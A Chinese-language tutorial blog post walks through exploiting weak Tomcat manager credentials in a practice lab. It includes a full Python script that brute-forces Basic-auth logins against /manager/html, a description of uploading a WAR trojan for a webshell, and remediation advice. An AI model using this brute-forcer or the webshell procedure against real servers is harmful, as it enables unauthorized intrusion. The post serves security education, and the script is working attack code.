从0到1学习网络安全 【Tomcat 弱口令拿webshell】

[ _07](https://www.jianshu.com/u/044de43a8ffc)关注赞赏支持

# 从0到1学习网络安全 【Tomcat 弱口令拿webshell】

## Tomcat 弱口令

> **注：今后继续定期更新---“实战”！**

* * *

###### Step1：环境搭建

###### 环境搭建这部分略过，今后所有的环境我都会放到公网，感兴趣的朋友可以直接玩。

> 新环境

这里是三个漏洞 Tomcat 弱口令 、 Tomcat put 上传 、ElasticSearch 命令执行；

* * *

###### Step2：Tomcat 弱口令漏洞复现

  * 首先，点击传送门进入漏洞地址 `http://xxx.xxx.xxx.xxx/`

> image.png

  * 漏洞形成原因

> 当Tomcat 在配置文件`tomcat/webapps/manager/META-
> INF/context.xml`开启允许远程部署环境时，可以通过爆破进入后台部署war包完成webshell上传；

登录时，抓包看到账号密码是通过base64加密的，解密后发现格式为`name:passwd`如图所示：  

登录时抓包

破解结果：

  

解码

编写python脚本进行爆破(初学python，大佬勿喷)：

    
    
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    #author：iChina
    #date:2019.3.4
    #
    
    import argparse
    import requests
    import base64
    import Queue
    import sys
    
    parser = argparse.ArgumentParser(description="tomcat_login.py -u target -p port")
    parser.add_argument('-u','--target',metavar="",help="The target site or ip")
    parser.add_argument('-p','--port',metavar="",default="18080",help="Destination port")
    parser.add_argument('-n','--name',metavar="",default="name.txt",help="name list")
    parser.add_argument('-pwd','--passwd',metavar="",default="passwd.txt",help="passwd list")
    args = parser.parse_args()
    url = args.target
    port = args.port
    name_list = args.name
    passwd_list = args.passwd
    poc_list = Queue.Queue()
    
    def list(name_list,passwd_list):
        n_list=open(name_list,'r')
        for name in n_list:
            p_list=open(passwd_list,'r')
            for pwd in p_list:
                name=name.strip()
                pwd=pwd.strip()
                put_poc(name,pwd)
    
    def put_poc(name,pwd):
            poc = name + ':' + pwd
            poc = base64.b64encode(poc)
            poc_list.put(poc)
            return poc_list
    
    def head(poc):
        headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9",
            "Authorization": "Basic " + poc
        }
        return headers
    
    def payload(url,port,headers,poc):
        url = url + ":" + port + "/manager/html"
        response = requests.get(url,headers=headers)
        code = response.status_code
        if code==200:
            poc = base64.b64decode(poc)
            print "The password is - " + poc
            sys.exit(0)
        else:
            pass
    
    def main():
        list(name_list,passwd_list)
        while not poc_list.empty():
            poc = poc_list.get()
            headers=head(poc)
            payload(url,port,headers,poc)
    
    if __name__ == '__main__':
            main()
    

爆破结果为：

  

爆破成功

登录后台部署自己的war包，有不知道war木马制作的可以百度搜一下；

上传war包

成功拿到shell：

  

webshell

###### Step3：修复建议

1.关闭远程部署。（可能影响运维人员正常操作）

2.在配置文件`/tomcat/conf/tomcat-users.xml`修改较为复杂的密码  

tomcat-users.xml

###### END

* * *

> 由于小编也在学习中，写的不好各位勿喷。  
>  [从0到1学习网络安全 【目录】](https://www.jianshu.com/p/d62992b1ff2a)  
>
>
> * * *
>
>  
>  实战靶场环境迁移：

[https://mp.weixin.qq.com/s/5Nat58sq85CmnW-
kWXAOsw](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5Nat58sq85CmnW-
kWXAOsw)

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [从0到1学习网络安全 【Tomcat put 上传（CVE-2017-12615）拿websh...](https://www.jianshu.com/p/a85dfa9a0e75)

Tomcat put 上传漏洞 注：今后继续定期更新---“实战”！ Step1：环境搭建 环境搭建这部分略过，今...

[_07](https://www.jianshu.com/u/044de43a8ffc)阅读 971评论 0赞 1

  * [从0到1学习网络安全 【ElasticSearch命令执行漏洞（CVE-2014-3120）】](https://www.jianshu.com/p/62122c29cce1)

ElasticSearch命令执行漏洞（CVE-2014-3120） 注：今后继续定期更新---“实战”！ Ste...

[_07](https://www.jianshu.com/u/044de43a8ffc)阅读 1,038评论 0赞 2

  * [从0到1学习网络安全 【目录】](https://www.jianshu.com/p/d62992b1ff2a)

文章仅用于供大家学习参考，请勿用于非法测试，否则后果自负！ 攻防相关文章已全部下线删除！ 简介 1.什么是网络安全...

[_07](https://www.jianshu.com/u/044de43a8ffc)阅读 11,237评论 10赞 101

  * [网络安全学习，及CTF学习资料整理](https://www.jianshu.com/p/0c9d7a7f808f)

php代码解密https://zhaoyuanma.com/Python https://docs.python....

[kepler404](https://www.jianshu.com/u/7432f0153fe4)阅读 10,464评论 4赞 31

  * [网络安全基础内容 速记](https://www.jianshu.com/p/37251a060c36)

安全术语 ： 安全漏洞的生命周期：漏洞被发现/漏洞信息被披露（expolit）漏洞具有官方补丁或修复方案 0day...

[击筑渐离](https://www.jianshu.com/u/77057338ea0b)阅读 167评论 0赞 1

 